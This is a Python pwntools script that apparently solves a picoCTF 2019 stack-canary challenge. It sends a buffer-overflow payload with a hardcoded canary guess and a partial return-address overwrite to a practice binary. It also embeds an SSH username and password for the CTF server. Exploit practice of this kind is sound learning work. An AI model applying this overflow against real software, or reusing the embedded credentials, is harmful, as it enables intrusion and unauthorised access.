from pwn import *

# Config
LOCAL = True
WRITE = True

# Setup
context.log_level = 'debug'
prob_dir = '/problems/canary_3_257a2a2061c96a7fb8326dbbc04d0328/'
exe = 'vuln'
if LOCAL:
    sh = process('./' + exe)
else:
    s = ssh(host='2019shell1.picoctf.com', user='thomasvn', password='#8L7Z#Fj')
    sh = s.process(prob_dir + exe, cwd=prob_dir)
    
# Build exploit
cmd = b'A' * 32   # buffer
cmd += b'B' * 8   # var
cmd += b'C' * 4   # var
cmd += b'1234'    # canary
cmd += b'D' * 8   # dunno
cmd += p64(0x000007ed)  # overwrite return
cmd_len = len(cmd)

# Write exploit to file
if WRITE:
    f = open('input.txt', 'w')
    f.write(str(cmd_len) + '\n')
    f.close()
    f = open('input.txt', 'ab')
    f.write(cmd)
    f.close()

# Buffer overflow
sh.sendlineafter('> ', str(cmd_len))
sh.sendlineafter('> ', cmd)
sh.interactive()
